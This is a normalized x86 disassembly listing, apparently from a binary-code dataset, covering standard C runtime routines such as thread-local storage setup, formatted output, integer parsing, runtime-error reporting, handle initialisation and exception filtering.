mov [ ebp - 0x4 ] 0xfffffffe
call sub_20088a8
push 0xc
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20088b4
push esi
call sub_200368f
pop ecx
push edi
call sub_2008360
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_200368f
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_2008188
pop ecx
sub_20088bd
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_20051a1
pop ecx
call sub_20085d7
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_200859a
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_200548b
push [ rw-data ]
call sub_20084ad
push [ rw-data ]
mov [ rw-data ] eax
call sub_20084ad
push [ rw-data ]
mov [ rw-data ] eax
call sub_20084ad
push [ rw-data ]
mov [ rw-data ] eax
call sub_20084ad
add esp 0x10
mov [ rw-data ] eax
call sub_200569a
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_200878e
push [ rw-data ]
call sub_2008528
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_200ba63
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_2008528
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_2008614
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_2008a4a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_2004235
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_2005621
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_200da30
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_200da7b
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_200d356
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2008b5f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_20076f2
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_2005621
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_2005621
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_20064fc
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_200b010
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_200db33
pop ecx
test eax eax
jne r-xdata
call sub_20064fc
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_200b010
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_200c9cb
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_200ca99
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_2008cc3
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_2008b5f
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_2008cf6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_2008cc3
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_2008d1c
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_2008cc3
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_2005621
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_2008cc3
sub_2008d69
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_2004235
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_2005621
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_20076f2
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_2009910
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_2009971
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_200df1e
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_200df1e
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_2003720
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_200d97b
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_2006ac1
add esp 0x14
push esi
call sub_2003720
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_200d97b
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_2003720
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_200d8c6
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_2006ac1
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_200d7ff
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_2006ac1
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_2006ac1
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_200ddb5
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_2006ac1
add esp 0x14
push r--data
push ebx
push edi
call sub_200d7ff
add esp 0xc
test eax eax
je r-xdata
sub_2009b1c
push 0x3
call sub_200df1e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_2009971
push 0xff
call sub_2009971
pop ecx
pop ecx
push 0x3
call sub_200df1e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_2009b64
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_2008528
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_2009ba0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_2009b90
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_2009c5e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_2004235
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_2005621
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_200da7b
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_2005621
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_2009e8d
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_2009c5e
add esp 0x14
pop ebp
retn
sub_2009eb8
push 0x54
push r--data
call sub_2006310
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_200ba63
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_200ba63
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_2006355
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200b9b6
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200b9b6
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_200a10c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_200ccb9
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_2005621
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_2005647
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_200a181
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_200b72d
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_200a1d2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_20086fb
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_200a332
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_200816a
